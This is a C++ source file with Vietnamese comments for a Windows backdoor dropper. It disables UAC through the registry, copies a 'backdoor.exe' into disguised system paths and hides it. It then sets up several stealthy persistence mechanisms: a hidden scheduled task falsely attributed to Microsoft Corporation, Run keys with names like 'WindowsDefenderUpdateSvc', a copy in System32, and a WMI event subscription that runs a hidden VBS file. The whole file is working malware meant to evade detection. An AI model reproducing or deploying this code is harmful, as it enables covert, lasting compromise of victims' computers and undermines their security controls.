#include <Windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <objbase.h>
#include <strsafe.h>
#include <string>
#include <fstream>
#include <taskschd.h>
#include <comdef.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "taskschd.lib")

// Helper function to convert wide string to narrow string
std::string WideToNarrow(const std::wstring &wide)
{
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), (int)wide.size(), NULL, 0, NULL, NULL);
    std::string narrow(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), (int)wide.size(), &narrow[0], size_needed, NULL, NULL);
    return narrow;
}

// Helper function to convert narrow string to wide string
std::wstring NarrowToWide(const std::string &narrow)
{
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, narrow.c_str(), (int)narrow.size(), NULL, 0);
    std::wstring wide(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, narrow.c_str(), (int)narrow.size(), &wide[0], size_needed);
    return wide;
}

// Hàm kiểm tra thư mục tồn tại và tạo nếu cần
bool EnsureDirectoryExists(const std::wstring &dirPath)
{
    // Kiểm tra xem thư mục đã tồn tại chưa
    DWORD attrs = GetFileAttributesW(dirPath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY))
        return true; // Đã tồn tại

    // Tạo đệ quy từ gốc
    size_t pos = dirPath.find_last_of(L"\\/");
    if (pos != std::wstring::npos)
    {
        const std::wstring parentDir = dirPath.substr(0, pos);
        if (!EnsureDirectoryExists(parentDir))
            return false;
    }

    // Tạo thư mục
    return CreateDirectoryW(dirPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

// Hàm kiểm tra và cài đặt .NET Framework nếu cần
bool EnsureDotNetSupport()
{
    // Tạo một quy trình PowerShell để kiểm tra .NET
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // Kiểm tra phiên bản .NET Framework đã cài đặt
    std::wstring cmd = L"powershell.exe -Command \"(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full' -Name Release -ErrorAction SilentlyContinue).Release -ge 461808\"";
    wchar_t *cmdLine = new wchar_t[cmd.length() + 1];
    wcscpy_s(cmdLine, cmd.length() + 1, cmd.c_str());

    BOOL result = CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    delete[] cmdLine;

    if (result)
    {
        // Đợi quá trình hoàn thành
        WaitForSingleObject(pi.hProcess, 10000); // Đợi tối đa 10 giây

        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Nếu .NET đã cài đặt, trả về true
        if (exitCode == 0)
        {
            // Thử kích hoạt .NET Framework
            STARTUPINFOW si2 = {sizeof(si2)};
            PROCESS_INFORMATION pi2 = {0};
            si2.dwFlags = STARTF_USESHOWWINDOW;
            si2.wShowWindow = SW_HIDE;

            // Sử dụng DISM để kích hoạt .NET Framework (Windows 8 trở lên)
            std::wstring cmd2 = L"powershell.exe -Command \"Enable-WindowsOptionalFeature -Online -FeatureName NetFx4 -All -NoRestart\"";
            wchar_t *cmdLine2 = new wchar_t[cmd2.length() + 1];
            wcscpy_s(cmdLine2, cmd2.length() + 1, cmd2.c_str());

            BOOL result2 = CreateProcessW(NULL, cmdLine2, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
            delete[] cmdLine2;

            if (result2)
            {
                WaitForSingleObject(pi2.hProcess, 60000); // Đợi tối đa 60 giây
                CloseHandle(pi2.hProcess);
                CloseHandle(pi2.hThread);
            }
        }
    }

    return true; // Giả định đã cài đặt hoặc đã kích hoạt
}

// Tạo entry startup đơn giản với tên "Apollo"
bool CreateApolloStartupEntry(const std::wstring &app_path)
{
    HKEY reg_key;
    const wchar_t *key_path = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExW(HKEY_CURRENT_USER, key_path, 0, KEY_SET_VALUE, &reg_key) != ERROR_SUCCESS)
        return false;

    // Tạo entry với tên "Apollo"
    LONG result = RegSetValueExW(reg_key, L"Apollo", 0, REG_SZ,
                                 (const BYTE *)app_path.c_str(),
                                 (DWORD)((app_path.size() + 1) * sizeof(wchar_t)));

    RegCloseKey(reg_key);
    return result == ERROR_SUCCESS;
}

// Function to create a scheduled task using COM API (more stealthy than schtasks.exe)
bool CreateStealthyTask(const std::wstring &app_path, const std::wstring &task_name)
{
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
        return false;

    // Create Task Service instance
    ITaskService *pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void **)&pService);
    if (FAILED(hr))
    {
        CoUninitialize();
        return false;
    }

    // Connect to Task Service
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        pService->Release();
        CoUninitialize();
        return false;
    }

    // Get task folder
    ITaskFolder *pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        pService->Release();
        CoUninitialize();
        return false;
    }

    // Check if task exists and delete it
    pRootFolder->DeleteTask(_bstr_t(task_name.c_str()), 0);

    // Create task definition
    ITaskDefinition *pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr))
    {
        pRootFolder->Release();
        pService->Release();
        CoUninitialize();
        return false;
    }

    // Set registration info
    IRegistrationInfo *pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (SUCCEEDED(hr))
    {
        hr = pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
        pRegInfo->put_Description(_bstr_t(L"Updates critical Windows components"));
        pRegInfo->Release();
    }

    // Set principal (security context)
    IPrincipal *pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (SUCCEEDED(hr))
    {
        hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST); // Request highest privileges
        pPrincipal->Release();
    }

    // Set settings
    ITaskSettings *pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (SUCCEEDED(hr))
    {
        hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        hr = pSettings->put_Hidden(VARIANT_TRUE);
        hr = pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S")); // No time limit
        hr = pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        hr = pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
        hr = pSettings->put_MultipleInstances(TASK_INSTANCES_PARALLEL);
        pSettings->Release();
    }

    // Create trigger - both at logon and startup
    ITriggerCollection *pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (SUCCEEDED(hr))
    {
        // Create logon trigger
        ITrigger *pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
        if (SUCCEEDED(hr))
        {
            pTrigger->Release();
        }

        // Create boot trigger
        ITrigger *pBootTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_BOOT, &pBootTrigger);
        if (SUCCEEDED(hr))
        {
            pBootTrigger->Release();
        }

        // Create daily trigger (runs every day)
        ITrigger *pDailyTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pDailyTrigger);
        if (SUCCEEDED(hr))
        {
            IDailyTrigger *pDailyTriggerInterface = NULL;
            hr = pDailyTrigger->QueryInterface(IID_IDailyTrigger, (void **)&pDailyTriggerInterface);
            if (SUCCEEDED(hr))
            {
                hr = pDailyTriggerInterface->put_StartBoundary(_bstr_t(L"2023-01-01T08:00:00"));
                hr = pDailyTriggerInterface->put_DaysInterval(1); // Every day
                pDailyTriggerInterface->Release();
            }
            pDailyTrigger->Release();
        }

        pTriggerCollection->Release();
    }

    // Create action
    IActionCollection *pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (SUCCEEDED(hr))
    {
        IAction *pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr))
        {
            IExecAction *pExecAction = NULL;
            hr = pAction->QueryInterface(IID_IExecAction, (void **)&pExecAction);
            if (SUCCEEDED(hr))
            {
                hr = pExecAction->put_Path(_bstr_t(app_path.c_str()));
                pExecAction->Release();
            }
            pAction->Release();
        }
        pActionCollection->Release();
    }

    // Register task
    IRegisteredTask *pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(task_name.c_str()),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask);

    if (pRegisteredTask)
        pRegisteredTask->Release();

    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

// Create registry run entry with less suspicious name
bool SetStartupEntry(const std::wstring &app_path, const std::wstring &entry_name)
{
    HKEY reg_key;
    const wchar_t *key_path = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExW(HKEY_CURRENT_USER, key_path, 0, KEY_SET_VALUE, &reg_key) != ERROR_SUCCESS)
        return false;

    LONG result = RegSetValueExW(reg_key, entry_name.c_str(), 0, REG_SZ,
                                 (const BYTE *)app_path.c_str(),
                                 (DWORD)((app_path.size() + 1) * sizeof(wchar_t)));

    RegCloseKey(reg_key);
    return result == ERROR_SUCCESS;
}

// Function to create WMI event subscription for persistence (advanced technique)
bool CreateWMISubscription(const std::wstring &app_path)
{
    // Create the VBS script content to run our executable
    std::wstring vbs_content = L"Set objShell = CreateObject(\"WScript.Shell\")\r\n";
    vbs_content += L"objShell.Run \"" + app_path + L"\", 0, False\r\n";

    // Create VBS file in Windows temp directory
    wchar_t temp_path[MAX_PATH];
    GetTempPathW(MAX_PATH, temp_path);
    std::wstring vbs_path = std::wstring(temp_path) + L"svchost_update.vbs";

    // Write the VBS file
    HANDLE hFile = CreateFileW(vbs_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return false;

    std::string ansi_content = WideToNarrow(vbs_content);
    DWORD bytesWritten;
    WriteFile(hFile, ansi_content.c_str(), (DWORD)ansi_content.length(), &bytesWritten, NULL);
    CloseHandle(hFile);

    // Create a permanent WMI event subscription using PowerShell (silent)
    std::wstring ps_command = L"powershell.exe -WindowStyle Hidden -Command \"";
    ps_command += L"$filterName = 'UpdateServices';"
                  L"$consumerName = 'UpdateServicesConsumer';"
                  L"$Query = \\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
                  L"TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=3\\\";"
                  L"$WMIEventFilter = Set-WmiInstance -Class __EventFilter -Namespace \\\"root\\subscription\\\" "
                  L"-Arguments @{Name=$filterName; EventNameSpace='root\\cimv2';"
                  L"QueryLanguage='WQL'; Query=$Query};"
                  L"$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace \\\"root\\subscription\\\" "
                  L"-Arguments @{Name=$consumerName; ScriptFileName='" +
                  vbs_path +
                  L"'; ScriptingEngine='VBScript'};"
                  L"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \\\"root\\subscription\\\" "
                  L"-Arguments @{Filter=$WMIEventFilter; Consumer=$WMIEventConsumer}\"";

    // Execute the PowerShell command to create WMI subscription
    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    wchar_t *cmdLine = new wchar_t[ps_command.length() + 1];
    wcscpy_s(cmdLine, ps_command.length() + 1, ps_command.c_str());

    BOOL result = CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    delete[] cmdLine;

    if (result)
    {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }

    return false;
}

// Function to obfuscate the executable
bool ObfuscateExecutable(const std::wstring &app_path)
{
    // Set file attributes to hidden and system
    SetFileAttributesW(app_path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    return true;
}

// Hàm tạo tệp CMD để chạy backdoor, hỗ trợ tốt hơn
bool CreateCommandLauncher(const std::wstring &backdoor_path)
{
    // Tạo đường dẫn đến tệp bat
    std::wstring batch_path = backdoor_path + L".cmd";

    // Nội dung batch file để chạy backdoor
    std::wstring batch_content = L"@echo off\r\n";
    batch_content += L"start \"\" /B \"" + backdoor_path + L"\"\r\n";
    batch_content += L"exit\r\n";

    // Ghi tệp batch
    HANDLE hFile = CreateFileW(batch_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
        return false;

    std::string ansi_content = WideToNarrow(batch_content);
    DWORD bytesWritten;
    BOOL success = WriteFile(hFile, ansi_content.c_str(), (DWORD)ansi_content.length(), &bytesWritten, NULL);
    CloseHandle(hFile);

    return success;
}

// Thêm Apollo vào C:\Windows\System32
bool CopyToSystem32(const std::wstring &sourcePath)
{
    wchar_t system_dir[MAX_PATH];
    if (!GetSystemDirectoryW(system_dir, MAX_PATH))
        return false;

    std::wstring apolloPath = std::wstring(system_dir) + L"\\Apollo.exe";
    return CopyFileW(sourcePath.c_str(), apolloPath.c_str(), FALSE) &&
           CreateApolloStartupEntry(apolloPath);
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Tắt UAC dialog nếu có thể
    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = L"cmd.exe";
    sei.lpParameters = L"/c reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShellExecuteExW(&sei);

    if (sei.hProcess)
    {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    // Đảm bảo .NET Framework được cài đặt
    EnsureDotNetSupport();

    // Initialize COM
    CoInitialize(NULL);

    // Tìm file backdoor trong thư mục temp
    wchar_t temp_path[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, temp_path))
    {
        CoUninitialize();
        return 1;
    }

    std::wstring backdoor_source = std::wstring(temp_path) + L"backdoor.exe";

    // Kiểm tra xem backdoor có tồn tại trong thư mục temp không
    DWORD backdoorAttrs = GetFileAttributesW(backdoor_source.c_str());
    if (backdoorAttrs == INVALID_FILE_ATTRIBUTES)
    {
        CoUninitialize();
        return 1; // Không tìm thấy backdoor, kết thúc chương trình
    }

    // Use a hidden location to store the backdoor file
    wchar_t system_dir[MAX_PATH];
    if (!GetSystemDirectoryW(system_dir, MAX_PATH))
    {
        CoUninitialize();
        return 1;
    }

    // Sử dụng các vị trí cài đặt thay thế - ưu tiên các thư mục mặc định
    std::wstring locations[] = {
        // Preferred locations
        L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUpdate.exe",
        L"C:\\Users\\Public\\Libraries\\system_update.exe",

        // Secondary locations
        std::wstring(system_dir) + L"\\LogonUI.bak",
        L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe.config", // Tệp cấu hình PowerShell thường được bỏ qua bởi AV
        L"C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\updater.exe"};

    // Define potential task names that look legitimate
    const wchar_t *taskNames[] = {
        L"Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
        L"Microsoft\\Windows\\WindowsUpdate\\NetworkStateChangeTask",
        L"Microsoft\\Windows\\Power\\PowerSchemeStateHandler"};

    // Define potential registry keys that look legitimate
    const wchar_t *regKeyNames[] = {
        L"WindowsDefenderUpdateSvc",
        L"NetFrameworkService",
        L"Apollo" // Thêm Apollo vào danh sách
    };

    // Try each location
    bool success = false;
    std::wstring backdoor_path;

    // Sao chép backdoor từ thư mục temp vào các vị trí ẩn mình
    for (const auto &loc : locations)
    {
        // Create directory path if needed
        std::wstring dirPath = loc.substr(0, loc.find_last_of(L'\\'));
        EnsureDirectoryExists(dirPath);

        if (CopyFileW(backdoor_source.c_str(), loc.c_str(), FALSE))
        {
            backdoor_path = loc;
            success = true;
            break;
        }
    }

    // If we failed to copy the backdoor, exit
    if (!success)
    {
        CoUninitialize();
        return 1;
    }

    // Hide the backdoor file
    ObfuscateExecutable(backdoor_path);

    // Tạo batch launcher để hỗ trợ chạy
    CreateCommandLauncher(backdoor_path);
    std::wstring batch_path = backdoor_path + L".cmd";

    // Use multiple persistence mechanisms for resilience
    // 1. Scheduled Task (main mechanism)
    CreateStealthyTask(batch_path, taskNames[0]);

    // 2. Registry Run key
    SetStartupEntry(batch_path, regKeyNames[0]);

    // 3. Thêm "Apollo" vào System32 và đặt làm startup
    CopyToSystem32(backdoor_path);

    // 4. WMI Event Subscription (advanced persistence that's hard to detect)
    CreateWMISubscription(batch_path);

    // Start the backdoor immediately
    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    wchar_t cmd[MAX_PATH + 10];
    StringCchPrintfW(cmd, MAX_PATH + 10, L"\"%s\"", batch_path.c_str());

    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (pi.hProcess)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CoUninitialize();
    return 0;
}